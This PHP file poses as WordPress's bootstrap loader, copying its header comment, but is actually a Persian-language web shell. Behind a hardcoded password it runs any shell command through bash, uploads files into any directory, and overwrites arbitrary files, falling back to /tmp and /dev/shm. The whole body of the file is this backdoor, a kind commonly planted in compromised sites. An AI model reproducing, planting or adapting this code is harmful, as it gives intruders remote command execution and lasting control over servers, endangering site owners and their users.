<?php 
/**
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 * If the wp-config.php file is not found then an error
 * will be displayed asking the visitor to set up the
 * wp-config.php file.
 *
 * Will also search for wp-config.php in WordPress' parent
 * directory to allow the WordPress directory to remain
 * untouched.
 *
 * @package WordPress
 */

error_reporting(E_ALL);
ini_set('display_errors', 1);

session_start();

$PASSWORD = '123456';

if (!isset($_SESSION['authenticated'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if ($_POST['password'] === $PASSWORD) {
            $_SESSION['authenticated'] = true;
        } else {
            $error = 'Incorrect password.';
        }
    } else {
        $error = '';
    }

    if (!isset($_SESSION['authenticated'])) {
        ?>
        <!DOCTYPE html>
        <html lang="fa">
        <head>
            <meta charset="UTF-8" />
            <title>شل</title>
            <style>
                body {
                    background: #000;
                    color: #f55;
                    font-family: Arial, sans-serif;
                    padding: 20px;
                    text-align: center;
                }
                img {
                    max-width: 300px;
                    margin-bottom: 20px;
                    display: block;
                    margin-left: auto;
                    margin-right: auto;
                }
                .password-box {
                    background: #111;
                    border: 1px solid #f55;
                    border-radius: 5px;
                    padding: 20px;
                    max-width: 320px;
                    margin: 0 auto;
                }
                input[type="password"] {
                    background: #111;
                    border: 1px solid #f55;
                    color: #f55;
                    border-radius: 5px;
                    padding: 8px;
                    width: 80%;
                    margin-bottom: 10px;
                    font-size: 16px;
                }
                button {
                    background: #111;
                    border: 1px solid #f55;
                    color: #f55;
                    border-radius: 5px;
                    padding: 8px 16px;
                    font-size: 16px;
                    cursor: pointer;
                }
                button:hover {
                    background: #c33;
                }
                .error {
                    color: #f55;
                    margin-top: 10px;
                }
            </style>
        </head>
        <body>
            <img src="https://i.ibb.co/rfwsZJMt/191919191919119919191919191.jpg" alt="Logo" />
            <div class="password-box">
                <form method="post" autocomplete="off">
                    <input type="password" name="password" placeholder="رمز را وارد کنید" required autofocus />
                    <br />
                    <button type="submit">ورود</button>
                </form>
                <?php if ($error !== '') {
                    echo '<div class="error">' . htmlspecialchars($error) . '</div>';
                } ?>
            </div>
        </body>
        </html>
        <?php
        exit;
    }
}

$current_dir = realpath($_GET['d'] ?? $_POST['d'] ?? getcwd());
if ($current_dir === false) {
    $current_dir = getcwd();
}

$msg = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['f']) && isset($_POST['d'])) {
        $current_dir = realpath($_POST['d']);
        if ($current_dir === false) $current_dir = getcwd();

        $uploadedFile = $_FILES['f'];

        if ($uploadedFile['error'] === UPLOAD_ERR_OK) {
            $targetPath = $current_dir . DIRECTORY_SEPARATOR . basename($uploadedFile['name']);
            if (move_uploaded_file($uploadedFile['tmp_name'], $targetPath)) {
                $msg = '<div style="background:#222; border:1px solid #f55; color:#f55; padding:10px; margin-top:10px; border-radius:5px; max-width:600px; margin-left:auto; margin-right:auto;">File "' . htmlspecialchars($uploadedFile['name']) . '" uploaded successfully.</div>';
            } else {
                $msg = '<div style="background:#222; border:1px solid #f55; color:#f55; padding:10px; margin-top:10px; border-radius:5px; max-width:600px; margin-left:auto; margin-right:auto;">Error: Failed to move uploaded file.</div>';
            }
        } else {
            $uploadErrors = [
                UPLOAD_ERR_INI_SIZE   => 'The uploaded file exceeds the upload_max_filesize directive in php.ini.',
                UPLOAD_ERR_FORM_SIZE  => 'The uploaded file exceeds the MAX_FILE_SIZE directive that was specified in the HTML form.',
                UPLOAD_ERR_PARTIAL    => 'The uploaded file was only partially uploaded.',
                UPLOAD_ERR_NO_FILE    => 'No file was uploaded.',
                UPLOAD_ERR_NO_TMP_DIR => 'Missing a temporary folder.',
                UPLOAD_ERR_CANT_WRITE => 'Failed to write file to disk.',
                UPLOAD_ERR_EXTENSION  => 'A PHP extension stopped the file upload.',
            ];
            $errorMsg = $uploadErrors[$uploadedFile['error']] ?? 'Unknown upload error.';
            $msg = '<div style="background:#222; border:1px solid #f55; color:#f55; padding:10px; margin-top:10px; border-radius:5px; max-width:600px; margin-left:auto; margin-right:auto;">Upload error: ' . htmlspecialchars($errorMsg) . '</div>';
        }
    } elseif (isset($_POST['c'])) {
        $cmd = trim($_POST['c']);
        if (preg_match('/^\s*cd\s+(.*)$/i', $cmd, $m)) {
            $new_dir = trim($m[1]);
            if ($new_dir === '') $new_dir = '/';
            if ($new_dir[0] !== '/') {
                $new_dir = $current_dir . DIRECTORY_SEPARATOR . $new_dir;
            }
            $real_new_dir = realpath($new_dir);
            if ($real_new_dir !== false && is_dir($real_new_dir)) {
                $current_dir = $real_new_dir;
            } else {
                $cd_error = "Error: Directory does not exist.";
            }
            $output = "";
        } else {
            $descriptorspec = [
                1 => ['pipe', 'w'],
                2 => ['pipe', 'w'],
            ];
            $process = proc_open("bash -c " . escapeshellarg("cd " . escapeshellarg($current_dir) . " && " . $cmd), $descriptorspec, $pipes);
            if (is_resource($process)) {
                $output = stream_get_contents($pipes[1]);
                fclose($pipes[1]);
                $error_output = stream_get_contents($pipes[2]);
                fclose($pipes[2]);
                proc_close($process);
                $output .= $error_output;
            } else {
                $output = "Failed to execute command.";
            }
        }
    }
}

function render_path_links($current_dir) {
    $parts = explode(DIRECTORY_SEPARATOR, trim($current_dir, DIRECTORY_SEPARATOR));
    $path = DIRECTORY_SEPARATOR;
    echo '<div style="margin-bottom:10px;">';
    echo '<form method="post" style="display:inline">';
    echo '<input type="hidden" name="d" value="'.htmlspecialchars(DIRECTORY_SEPARATOR).'">';
    echo '<button style="background:none;border:none;color:#f55;cursor:pointer;font-size:16px">/</button>';
    echo '</form> / ';
    foreach ($parts as $index => $part) {
        if ($part === '') continue;
        $path .= $part . DIRECTORY_SEPARATOR;
        echo '<form method="post" style="display:inline">';
        echo '<input type="hidden" name="d" value="'.htmlspecialchars(rtrim($path, DIRECTORY_SEPARATOR)).'">';
        echo '<button type="submit" style="background:none;border:none;color:#f55;cursor:pointer;font-size:16px">'.htmlspecialchars($part).'</button>';
        echo '</form>';
        if ($index < count($parts) - 1) echo ' / ';
    }
    echo '</div>';
}
?>
<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8" />
    <title>شل</title>
    <style>
        body {background:#000; color:#f55; font-family: Arial, sans-serif; padding:20px; text-align:center;}
        input, button, textarea {background:#111; border:1px solid #f55; color:#f55; border-radius:5px; padding:8px; margin:5px;}
        button:hover {background:#c33; cursor:pointer;}
        pre {background:#111; border-radius:5px; padding:10px; text-align:left; min-height:150px; white-space: pre-wrap; word-break: break-word; color:#0f0;}
        form.inline {display:inline;}
        .upload-container {
            margin-top: 20px;
            border-top:1px solid #f55;
            padding-top:20px;
            max-width:600px;
            margin-left:auto;
            margin-right:auto;
            text-align: center;
        }
    </style>
</head>
<body>
    <img src="https://i.ibb.co/rfwsZJMt/191919191919119919191919191.jpg" alt="Logo" style="max-width:100%; margin-bottom:20px;">
    <?php render_path_links($current_dir); ?>
    <form method="post" autocomplete="off">
        <input type="hidden" name="d" value="<?php echo htmlspecialchars($current_dir); ?>" />
        <input type="text" name="c" placeholder="دستورات را اینجا وارد کنید" style="width:60%;" required />
        <button type="submit">اجرا</button>
    </form>
    <?php
    if (isset($cd_error)) {
        echo '<p style="color:#f55;">'.$cd_error.'</p>';
    }
    if (isset($output)) {
        echo '<pre>' . htmlspecialchars($output) . '</pre>';
    }
    ?>
    <div class="upload-container">
        <form method="post" enctype="multipart/form-data" autocomplete="off" style="display:inline-block; text-align:center; width:100%;">
            <input type="hidden" name="d" value="<?php echo htmlspecialchars($current_dir); ?>" />
            <input type="file" name="f" required />
            <button type="submit" style="margin-left:10px;">Upload File</button>
        </form>
        <?php
            if ($msg !== '') {
                echo $msg;
            }
        ?>
    </div>
</body>
</html>


<?php
if (isset($_GET['safeedit']) && isset($_SESSION['authenticated'])) {
    $target = $_GET['safeedit'];
    $canWrite = is_writable($target);
    $alt1 = "/dev/shm/" . basename($target) . ".poc";
    $alt2 = "/tmp/" . basename($target) . ".poc";

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['data'])) {
        $data = $_POST['data'];
        if ($canWrite) {
            if (@file_put_contents($target, $data) !== false) {
                echo "<p style='color:lime;'>✅ فایل اصلی ذخیره شد.</p>";
            } else {
                echo "<p style='color:red;'>❌ خطا در نوشتن روی فایل اصلی.</p>";
            }
        } else {
            if (@file_put_contents($alt1, $data) !== false) {
                echo "<p style='color:orange;'>⚠️ ذخیره شد در مسیر جایگزین: <code>$alt1</code></p>";
            } elseif (@file_put_contents($alt2, $data) !== false) {
                echo "<p style='color:orange;'>⚠️ ذخیره شد در مسیر جایگزین: <code>$alt2</code></p>";
            } else {
                echo "<p style='color:red;'>❌ امکان نوشتن حتی در /tmp و /dev/shm وجود ندارد.</p>";
            }
        }
    }

    $current = @file_get_contents($target);
    if ($current === false) $current = '';
    echo "<h3>📝 ویرایش: <code>$target</code></h3>";
    echo "<form method='POST'>";
    echo "<textarea name='data' rows='20' cols='100' style='background:#111; color:#0f0;'>".htmlspecialchars($current)."</textarea><br>";
    echo "<button type='submit'>💾 ذخیره</button>";
    echo "</form>";
    exit;
}
?>
